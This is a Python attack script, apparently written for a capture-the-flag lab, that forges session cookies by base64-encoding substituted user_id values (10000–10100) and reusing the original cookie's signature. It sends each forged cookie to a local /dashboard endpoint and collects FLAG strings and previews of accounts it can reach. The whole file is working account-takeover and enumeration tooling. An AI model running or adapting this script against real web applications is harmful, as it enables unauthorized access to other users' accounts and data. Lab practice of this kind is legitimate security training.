import requests
import base64
import json
import re
import time

# Original session cookie structure
original_cookie = "eyJ1c2VyX2lkIjoiMTAwMzIifQ.aVd0oA.VqPUgS4MLdLZbrF9JRNetU8FfwI"
timestamp_signature = ".aVd0oA.VqPUgS4MLdLZbrF9JRNetU8FfwI"

base_url = "http://127.0.0.1:33187"
endpoint = "/dashboard"

successful_ids = []
all_responses = {}

print("[*] Starting session cookie brute force for user_id values 10000-10100")
print(f"[*] Testing against {base_url}{endpoint}")
print("[*] Original user_id: 10032\n")

# Test each user_id from 10000 to 10100
for user_id in range(10000, 10101):
    # Create modified payload
    payload_dict = {"user_id": str(user_id)}
    payload_json = json.dumps(payload_dict, separators=(',', ':'))
    
    # Base64 encode the payload (without padding)
    encoded_payload = base64.b64encode(payload_json.encode()).decode().rstrip('=')
    
    # Construct the modified cookie
    modified_cookie = encoded_payload + timestamp_signature
    
    try:
        # Test the cookie
        response = requests.get(
            f"{base_url}{endpoint}", 
            cookies={'session': modified_cookie},
            timeout=10
        )
        
        # Store response details
        content_length = len(response.content)
        status_code = response.status_code
        
        # Check for flags in response
        flag_matches = re.findall(r'FLAG\{[^}]+\}', response.text)
        
        # Check if response contains meaningful content
        is_valid = False
        if status_code == 200:
            is_valid = True
        elif status_code not in [403]:
            # 404 or other codes might be interesting
            is_valid = True
        
        if is_valid:
            successful_ids.append({
                'user_id': user_id,
                'status_code': status_code,
                'content_length': content_length,
                'flags': flag_matches,
                'preview': response.text[:300]
            })
            
            if flag_matches:
                print(f"[!] FLAG FOUND at user_id={user_id}")
                for flag in flag_matches:
                    print(f"    {flag}")
        
        all_responses[user_id] = {
            'status_code': status_code,
            'content_length': content_length,
            'flags': flag_matches
        }
        
        # Progress indicator
        if user_id % 20 == 0:
            print(f"[*] Progress: Tested {user_id - 10000}/101 user IDs...")
            
        # Small delay to avoid overwhelming the server
        time.sleep(0.05)
            
    except Exception as e:
        print(f"[!] Error testing user_id {user_id}: {str(e)}")

# Summary
print("\n" + "="*70)
print("BRUTE FORCE COMPLETE")
print("="*70)
print(f"Total accounts with accessible data: {len(successful_ids)}")

# Show all successful accesses
if successful_ids:
    print("\nAccessible accounts:")
    for account in successful_ids:
        print(f"  User ID: {account['user_id']}")
        print(f"    Status: {account['status_code']} | Size: {account['content_length']}B")
        if account['flags']:
            for flag in account['flags']:
                print(f"    FLAG: {flag}")
        print(f"    Preview: {account['preview'][:100]}...")
        print()

# Look for patterns
print("Response pattern analysis:")
status_dist = {}
size_dist = {}
for uid, data in all_responses.items():
    status = data['status_code']
    size = data['content_length']
    status_dist[status] = status_dist.get(status, 0) + 1
    size_dist[size] = size_dist.get(size, 0) + 1

print(f"  Status codes: {dict(status_dist)}")
print(f"  Unique response sizes: {len(size_dist)}")

# Show unique sizes
if len(size_dist) > 1:
    print("\nResponse sizes and user IDs:")
    for size in sorted(size_dist.keys()):
        if size_dist[size] < 10:  # Only show uncommon sizes
            uids = [uid for uid, data in all_responses.items() if data['content_length'] == size]
            print(f"  Size {size}B: {uids}")

# All flags found
all_flags = []
for account in successful_ids:
    all_flags.extend(account['flags'])

if all_flags:
    print(f"\n[!] TOTAL FLAGS FOUND: {len(all_flags)}")
    for flag in all_flags:
        print(f"  {flag}")
